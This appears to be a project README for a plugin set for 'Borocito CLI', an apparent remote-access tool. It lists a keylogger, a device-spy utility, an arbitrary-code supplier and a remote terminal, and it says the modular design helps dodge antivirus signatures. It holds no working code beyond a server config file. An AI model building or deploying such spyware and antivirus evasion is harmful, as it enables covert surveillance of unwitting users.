
# Components for Borocito
Add-Ons/Plugins/Components for `Borocito CLI`  

## Why?
These plugins were created to enrich the experience with `Borocito CLI`.  

They're not perfect, but they're not disappointing either. Well, it really depends on how they're made. I invite you to contribute to the development of these, if there is something, an error, bug, an idea, etc, contribute, I will greatly appreciate it, and those of us who use these complements too.  

### Using it
All plugins present here were originally created by [Zhenboro](https://github.com/Zhenboro). And for its use, it is vital and mandatory to use `boro-get`, it must be installed in order to use and manage the plugins mentioned here.  
`boro-get` is a module within `Borocito CLI`. It's totally inside, well implemented. So, initially, there should be no problem.  

### About
BORO-GET tries to solve the following problem: Avoid over-loading the distributable executable. In addition, this gives freedom to create your own supplements and install them remotely. Total control. If you need a function, you can program it and implement it for yourself.  
Not only that, we also avoid the signature of the antivirus. Well, for example, `broKiloger` is very sus, it is a keys recorder. Thus the antivirus could only block that complement, but, not the instance of `Borocito CLI`.  

### Repository
On the server, the Boro-Get folder is where everything `boro-get` will use.
You can leave the files that are within `boro-get` as they were when you downloaded them, this will make my repository be used located in my inventible "`chemic-jug`" server.   
Also, if you want to use another server to provide you with the repository, you must modify the file `Boro-Get/config.ini` that is in the `Borocito Server-Side` Boro-Get folder:   
```ini
[CONFIG]
Binaries=http://borocito.local/Boro-Get/REPO/boro-get.zip
Repositories=http://borocito.local/Boro-Get/Repositories.ini
```
Do that change writting seting the `config.ini` file as shown:  
```ini
# Boro-Get Configuration File
[ASSEMBLY]
Name=boro-get
Version=1.2.0.0
Author=Zhenboro
Web=https://github.com/Borocito/Components-for-Borocito/tree/main/boro-get
[CONFIG]
Binaries=http://borocito.local/Boro-Get/REPO/boro-get.zip
Repositories=http://borocito.local/Boro-Get/Repositories.ini
```

---
# Documentation
|Component|Information|Docs|
|--|--|--|
|boro-get|Packet manager|[View](https://github.com/Borocito/Components-for-Borocito/tree/main/boro-get)|
|boro-comm|Multi-client TCP/IP communicator|[View](https://github.com/Borocito/Components-for-Borocito/tree/main/boro-comm)|
|boro-hear|Response manager|[View](https://github.com/Borocito/Components-for-Borocito/tree/main/boro-hear)|
|broArbitra|Arbitrary Code Supplier|[View](https://github.com/Borocito/Components-for-Borocito/tree/main/broArbitra)|
|broCiemdi|Interactive terminal|[View](https://github.com/Borocito/Components-for-Borocito/tree/main/broCiemdi)|
|broEstoraje|FileSystem Operations|[View](https://github.com/Borocito/Components-for-Borocito/tree/main/broEstoraje)|
|broFaierwoll|Firewall rule creator|[View](https://github.com/Borocito/Components-for-Borocito/tree/main/broFaierwoll)|
|broKiloger|Keylogger|[View](https://github.com/Borocito/Components-for-Borocito/tree/main/broKiloger)|
|broMaintainer|Maintainer for Borocito CLI|[View](https://github.com/Borocito/Components-for-Borocito/tree/main/broMaintainer)|
|broProkci|Connect Borocito CLI with a Cloud-Based TCP/IP socker server|[View](https://github.com/Borocito/Components-for-Borocito/tree/main/broProkci)|
|broReedit|Windows Registry Editor|[View](https://github.com/Borocito/Components-for-Borocito/tree/main/broReedit)|
|broRescue|Emergency Component for Borocito CLI|[View](https://github.com/Borocito/Components-for-Borocito/tree/main/broRescue)|
|broScrincam|Device Spy IO utilities|[View](https://github.com/Borocito/Components-for-Borocito/tree/main/broScrincam)|

---
## WARNING
**The plugins created are not perfect. I recommend you take a look at the code to know what it does and how it does it, so you avoid unpredictable behavior or bad practices.**
